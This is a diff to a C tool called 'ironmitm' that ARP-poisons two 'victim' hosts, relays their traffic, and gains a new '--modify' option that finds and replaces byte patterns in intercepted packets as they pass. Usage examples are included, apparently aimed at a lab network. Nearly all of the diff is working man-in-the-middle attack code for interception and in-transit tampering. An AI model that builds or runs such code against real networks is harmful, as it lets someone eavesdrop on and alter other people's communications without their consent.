@@ -31,9 +31,21 @@
 
 #define MAX_PKT 2048
 #define ARP_INTERVAL 2  /* seconds between ARP poison refreshes */
+#define MAX_RULES 8
+#define MAX_PATTERN 64
+
+typedef struct {
+    char find[MAX_PATTERN];
+    char replace[MAX_PATTERN];
+    int find_len;
+    int replace_len;
+    int hits;
+} modify_rule_t;
 
 static volatile int g_running = 1;
 static FILE *g_log_file = NULL;
+static modify_rule_t g_rules[MAX_RULES];
+static int g_rule_count = 0;
 
 static void signal_handler(int sig) { (void)sig; g_running = 0; }
 
@@ -108,6 +120,52 @@ static void send_arp_reply(int fd, int ifindex,
 
 /* ---- Logging ---- */
 
+static int add_modify_rule(const char *spec) {
+    /* Format: "find:replace" */
+    if (g_rule_count >= MAX_RULES) return -1;
+    const char *colon = strchr(spec, ':');
+    if (!colon) return -1;
+
+    modify_rule_t *r = &g_rules[g_rule_count];
+    r->find_len = (int)(colon - spec);
+    if (r->find_len >= MAX_PATTERN) r->find_len = MAX_PATTERN - 1;
+    memcpy(r->find, spec, r->find_len);
+    r->find[r->find_len] = 0;
+
+    r->replace_len = strlen(colon + 1);
+    if (r->replace_len >= MAX_PATTERN) r->replace_len = MAX_PATTERN - 1;
+    memcpy(r->replace, colon + 1, r->replace_len);
+    r->replace[r->replace_len] = 0;
+
+    r->hits = 0;
+    g_rule_count++;
+    return 0;
+}
+
+static int apply_modifications(uint8_t *pkt, int len) {
+    /* Search payload (after eth+ip+tcp/udp headers, ~54 bytes) for patterns */
+    int modified = 0;
+    int hdr_skip = 54; /* eth(14) + ip(20) + tcp(20) minimum */
+    if (len <= hdr_skip) return 0;
+
+    for (int r = 0; r < g_rule_count; r++) {
+        modify_rule_t *rule = &g_rules[r];
+        /* Only replace if find and replace are same length (simple in-place) */
+        if (rule->find_len != rule->replace_len) continue;
+
+        for (int i = hdr_skip; i <= len - rule->find_len; i++) {
+            if (memcmp(pkt + i, rule->find, rule->find_len) == 0) {
+                memcpy(pkt + i, rule->replace, rule->replace_len);
+                rule->hits++;
+                modified++;
+                printf("  [MODIFY] Replaced \"%s\" with \"%s\" at offset %d\n",
+                       rule->find, rule->replace, i);
+            }
+        }
+    }
+    return modified;
+}
+
 static void log_packet(const uint8_t *pkt, int len, const char *direction) {
     if (len < 34) return; /* need at least eth + ip header */
 
@@ -164,7 +222,16 @@ static void forward_packet(int fd, int ifindex, uint8_t *pkt, int len,
 /* ---- Main ---- */
 
 static void usage(void) {
-    fprintf(stderr, "Usage: ironmitm --victim-a <ip> --victim-b <ip> --iface <name> [--log <file>]\n");
+    fprintf(stderr, "Usage: ironmitm --victim-a <ip> --victim-b <ip> --iface <name> [options]\n\n");
+    fprintf(stderr, "Options:\n");
+    fprintf(stderr, "  --log <file>           Log intercepted traffic to file\n");
+    fprintf(stderr, "  --modify <find:replace> Modify payload in transit (same-length only)\n");
+    fprintf(stderr, "                          Can be specified multiple times\n");
+    fprintf(stderr, "  --help                 Show this help\n");
+    fprintf(stderr, "\nExamples:\n");
+    fprintf(stderr, "  ironmitm --victim-a 10.0.1.1 --victim-b 10.0.1.2 --iface iron0\n");
+    fprintf(stderr, "  ironmitm --victim-a 10.0.1.1 --victim-b 10.0.1.2 --iface iron0 --modify \"secret:XXXXXX\"\n");
+    fprintf(stderr, "  ironmitm --victim-a 10.0.1.1 --victim-b 10.0.1.2 --iface iron0 --modify \"OK:NO\" --modify \"bar:XXX\"\n");
 }
 
 int main(int argc, char **argv) {
@@ -177,6 +244,7 @@ int main(int argc, char **argv) {
         else if (strcmp(argv[i], "--victim-b") == 0 && i + 1 < argc) victim_b_str = argv[++i];
         else if (strcmp(argv[i], "--iface") == 0 && i + 1 < argc) iface = argv[++i];
         else if (strcmp(argv[i], "--log") == 0 && i + 1 < argc) log_path = argv[++i];
+        else if (strcmp(argv[i], "--modify") == 0 && i + 1 < argc) add_modify_rule(argv[++i]);
         else if (strcmp(argv[i], "--help") == 0) { usage(); return 0; }
     }
 
@@ -200,6 +268,11 @@ int main(int argc, char **argv) {
     printf("  Victim B: %s\n", victim_b_str);
     printf("  Iface:    %s\n", iface);
     if (log_path) printf("  Log:      %s\n", log_path);
+    if (g_rule_count > 0) {
+        printf("  Modify:   %d rules\n", g_rule_count);
+        for (int r = 0; r < g_rule_count; r++)
+            printf("    [%d] \"%s\" -> \"%s\"\n", r + 1, g_rules[r].find, g_rules[r].replace);
+    }
     printf("\n");
 
     /* Open log file */
@@ -318,10 +391,12 @@ int main(int argc, char **argv) {
 
         if (pkt_src_ip == victim_a_ip && pkt_dst_ip == victim_b_ip) {
             log_packet(pkt, n, "A->B");
+            apply_modifications(pkt, n);
             forward_packet(fd, ifindex, pkt, n, mac_b, my_mac);
             forwarded++;
         } else if (pkt_src_ip == victim_b_ip && pkt_dst_ip == victim_a_ip) {
             log_packet(pkt, n, "B->A");
+            apply_modifications(pkt, n);
             forward_packet(fd, ifindex, pkt, n, mac_a, my_mac);
             forwarded++;
         }
@@ -330,6 +405,13 @@ int main(int argc, char **argv) {
     printf("\n  [mitm] Stopped.\n");
     printf("  [mitm] Intercepted: %d packets\n", intercepted);
     printf("  [mitm] Forwarded:   %d packets\n", forwarded);
+    if (g_rule_count > 0) {
+        printf("  [mitm] Modification rules:\n");
+        for (int r = 0; r < g_rule_count; r++) {
+            printf("    \"%s\" -> \"%s\": %d hits\n",
+                   g_rules[r].find, g_rules[r].replace, g_rules[r].hits);
+        }
+    }
     if (g_log_file) { fclose(g_log_file); printf("  [mitm] Log saved.\n"); }
     printf("\n");
 
